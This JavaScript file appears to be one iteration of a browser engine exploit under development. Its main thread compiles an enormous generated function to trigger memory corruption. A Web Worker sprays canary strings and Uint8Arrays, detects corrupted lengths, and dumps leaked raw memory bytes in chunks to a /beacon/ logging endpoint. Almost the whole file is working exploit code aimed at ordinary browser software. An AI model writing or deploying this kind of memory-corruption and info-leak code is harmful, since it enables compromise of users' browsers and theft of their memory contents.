// p151 — Worker-based corruption detector with Uint8Array targets
// PROVEN: p146 Worker detected .length=81400 during execution.
// NEW: Add Uint8Array targets in Worker. If m_vector is corrupted,
//   typed array reads go to a wrong address → raw byte leak.
// Strategy: Worker allocates targets + polls. Main thread compiles + calls.
// The call crashes eventually, but Worker captures data first.
// Beacon prefix: V151-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V151-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ---- Worker: allocates targets, polls for corruption ----
  var workerCode = [
    'var STR_LEN = 100076;',
    'var CANARY = 0x41;',
    'var U8_SZ = 64;',
    'var U8_CANARY = 0xBB;',
    '',
    '// String targets',
    'var strs = [];',
    'for (var i = 0; i < 30; i++) {',
    '  var s = String.fromCharCode(CANARY).repeat(STR_LEN);',
    '  s.charCodeAt(0);',
    '  strs.push(s);',
    '}',
    '',
    '// Uint8Array targets (48B cells in MarkedSpace)',
    'var u8s = [];',
    'for (var i = 0; i < 50; i++) {',
    '  var u = new Uint8Array(U8_SZ);',
    '  for (var j = 0; j < U8_SZ; j++) u[j] = U8_CANARY;',
    '  u8s.push(u);',
    '}',
    '',
    'function hexByte(v) { return (v < 16 ? "0" : "") + v.toString(16); }',
    '',
    'function beacon(tag) {',
    '  try {',
    '    var x = new XMLHttpRequest();',
    '    x.open("GET", "/beacon/V151-W-" + tag + "?t=" + Date.now(), true);',
    '    x.send();',
    '  } catch (e) {}',
    '}',
    '',
    'beacon("READY-S" + strs.length + "-U" + u8s.length);',
    '',
    'var strHits = 0;',
    'var u8Hits = 0;',
    'var pollCount = 0;',
    'var done = false;',
    '',
    'function poll() {',
    '  if (done) return;',
    '  pollCount++;',
    '',
    '  // Check strings',
    '  for (var i = 0; i < strs.length; i++) {',
    '    try {',
    '      var len = strs[i].length;',
    '      if (len !== STR_LEN) {',
    '        strHits++;',
    '        beacon("S" + i + "-len=" + len + "-poll=" + pollCount);',
    '',
    '        // Read charCodeAt for data leak',
    '        var leak = "";',
    '        for (var j = 0; j < Math.min(32, len); j++) {',
    '          try { leak += hexByte(strs[i].charCodeAt(j)); }',
    '          catch (e) { leak += "XX"; }',
    '        }',
    '        beacon("SL" + i + "-" + leak);',
    '',
    '        // Read at boundary',
    '        if (len > 0 && len < 200000) {',
    '          var bnd = "";',
    '          var bs = Math.max(0, len - 2);',
    '          for (var b = bs; b < Math.min(len + 4, 200000); b++) {',
    '            try { bnd += hexByte(strs[i].charCodeAt(b)); }',
    '            catch (e) { bnd += "XX"; }',
    '          }',
    '          beacon("SB" + i + "-@" + bs + "-" + bnd);',
    '        }',
    '      }',
    '    } catch (e) {',
    '      strHits++;',
    '      beacon("SERR" + i + "-" + pollCount);',
    '    }',
    '  }',
    '',
    '  // Check Uint8Arrays',
    '  for (var i = 0; i < u8s.length; i++) {',
    '    try {',
    '      var v0 = u8s[i][0];',
    '      var vLen = u8s[i].length;',
    '      if (v0 !== U8_CANARY || vLen !== U8_SZ) {',
    '        u8Hits++;',
    '        beacon("U" + i + "-v0=" + hexByte(v0) + "-len=" + vLen + "-poll=" + pollCount);',
    '',
    '        // Dump all bytes — this is raw memory from corrupted m_vector!',
    '        var hex = "";',
    '        for (var j = 0; j < Math.min(vLen, 128); j++) {',
    '          try { hex += hexByte(u8s[i][j]); }',
    '          catch (e) { hex += "XX"; }',
    '        }',
    '        // Split into beacon-sized chunks',
    '        for (var c = 0; c < hex.length; c += 120) {',
    '          beacon("UD" + i + "-" + c + "-" + hex.substring(c, c + 120));',
    '        }',
    '      }',
    '    } catch (e) {',
    '      u8Hits++;',
    '      beacon("UERR" + i + "-" + pollCount);',
    '    }',
    '  }',
    '',
    '  if (strHits > 0 || u8Hits > 0) {',
    '    beacon("FOUND-S" + strHits + "-U" + u8Hits + "-poll=" + pollCount);',
    '    done = true;',
    '    return;',
    '  }',
    '',
    '  if (pollCount < 5000) {',
    '    setTimeout(poll, 2);',
    '  } else {',
    '    beacon("TIMEOUT-" + pollCount);',
    '    done = true;',
    '  }',
    '}',
    '',
    'setTimeout(poll, 10);',
  ].join('\n');

  var workerBlob = new Blob([workerCode], { type: 'application/javascript' });
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  B('WORKER-CREATED');

  // Give Worker time to allocate targets
  setTimeout(function() {
    phaseBuild();
  }, 500);

  // ---- Build + compile + call (main thread) ----
  function phaseBuild() {
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    // Try the THROW trick: put throw first, a() calls after
    // Compiler processes all 38M a() calls (generates metadata)
    // Execution hits throw immediately → survive
    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p151fn=function(a){throw "__P151_STOP__";';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p151ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p151ok ? 'OK' : 'FAIL'));
      if (!window.__p151fn) { B('NO-FN'); return; }

      // Try calling — throw should fire immediately
      setTimeout(function() {
        B('CALLING-THROW');
        try {
          window.__p151fn(function(){});
          B('SURVIVED-NOTHROW');
        } catch (ex) {
          if (ex === '__P151_STOP__') {
            B('THROW-CAUGHT');
          } else {
            B('CATCH-' + String(ex).substring(0, 40));
          }
        }

        // After surviving, also try calling WITHOUT throw
        // Build a second function with no throw (regular call)
        setTimeout(function() {
          B('PHASE2-NOCATCH');
          // Don't rebuild — just call with the crashing path
          // Actually, let the Worker keep polling while we wait
          // The Worker should detect corruption from compilation
          B('WAITING-WORKER');
        }, 500);
      }, 200);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
